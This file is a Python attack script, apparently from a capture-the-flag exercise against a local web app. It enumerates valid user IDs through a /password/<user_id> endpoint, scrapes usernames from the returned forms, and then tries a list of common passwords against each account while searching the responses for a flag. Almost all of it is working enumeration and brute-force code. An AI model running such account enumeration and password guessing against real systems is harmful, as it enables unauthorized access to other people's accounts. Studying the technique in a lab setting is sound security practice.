import requests
import re

BASE_URL = "http://127.0.0.1:32883"

print("[*] Enumerating user IDs via /password/<user_id> endpoint\n")

# Test ranges
test_ranges = [
    ("Low IDs", range(1, 101)),
    ("Around known ID", range(10000, 10100)),
    ("High range", range(99900, 100000)),
]

valid_users = []
progress_counter = 0

for range_name, id_range in test_ranges:
    print(f"[*] Testing {range_name}")
    
    for user_id in id_range:
        progress_counter += 1
        
        if progress_counter % 50 == 0:
            print(f"  [PROGRESS] Tested {progress_counter} IDs, found {len(valid_users)} valid users")
        
        try:
            resp = requests.get(f"{BASE_URL}/password/{user_id}", allow_redirects=False, timeout=3)
            
            # Check if user exists (not "User not found" error)
            if resp.status_code == 200:
                # User exists! GET request shows the password form
                print(f"\n[+] VALID USER: user_id={user_id}")
                print(f"    Status: {resp.status_code}")
                print(f"    Length: {len(resp.text)}B")
                
                # Extract details from the form
                username_match = re.search(r'value="([^"]+)"[^>]*name="username"', resp.text)
                user_id_match = re.search(r'value="(\d+)"[^>]*name="user_id"', resp.text)
                welcome_match = re.search(r'Welcome, ([^!]+)!', resp.text)
                
                username = username_match.group(1) if username_match else "N/A"
                form_user_id = user_id_match.group(1) if user_id_match else "N/A"
                welcome_name = welcome_match.group(1) if welcome_match else "N/A"
                
                print(f"    Username: {username}")
                print(f"    Form user_id: {form_user_id}")
                print(f"    Welcome name: {welcome_name}")
                
                valid_users.append({
                    'user_id': user_id,
                    'username': username,
                    'name': welcome_name,
                    'response': resp.text
                })
                
                # Check for FLAG in response
                flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag_match:
                    print(f"\n{'='*60}")
                    print(f"[!] FLAG FOUND: {flag_match.group(0)}")
                    print(f"{'='*60}")
                    print(f"\n    Full response:\n{resp.text}\n")
                    break
            elif resp.status_code != 302:
                # Unexpected response
                print(f"[?] user_id={user_id}: Unexpected status {resp.status_code}")
        
        except Exception as e:
            pass
    
    if any('FLAG' in str(u) for u in valid_users):
        break
    
    print()

print(f"\n{'='*60}")
print(f"[SUMMARY]")
print(f"Total tested: {progress_counter}")
print(f"Valid users found: {len(valid_users)}")

if valid_users:
    print(f"\n[+] Valid user accounts:")
    for user in valid_users:
        print(f"    user_id={user['user_id']}: username={user['username']}, name={user['name']}")
    
    # Try to authenticate as these users
    print(f"\n[*] Attempting authentication with discovered users")
    
    # Common passwords
    passwords = ['test', 'password', 'admin', '123456', 'password123', '']
    
    for user in valid_users:
        print(f"\n[+] Testing user_id={user['user_id']} ({user['username']})")
        
        for pwd in passwords:
            auth_data = {
                'username': user['username'],
                'password': pwd,
                'user_id': str(user['user_id'])
            }
            
            try:
                auth_resp = requests.post(f"{BASE_URL}/password/test", data=auth_data, allow_redirects=True, timeout=5)
                
                if '/dashboard' in auth_resp.url or (auth_resp.status_code == 200 and 'error' not in auth_resp.url):
                    print(f"    [+] SUCCESS with password='{pwd}'")
                    print(f"    Final URL: {auth_resp.url}")
                    print(f"    Response length: {len(auth_resp.text)}B")
                    
                    # Check for FLAG
                    flag_match = re.search(r'FLAG\{[^}]+\}', auth_resp.text)
                    if flag_match:
                        print(f"\n    [!] FLAG: {flag_match.group(0)}")
                        print(f"\n    Full response:\n{auth_resp.text}")
                    break
            except:
                pass

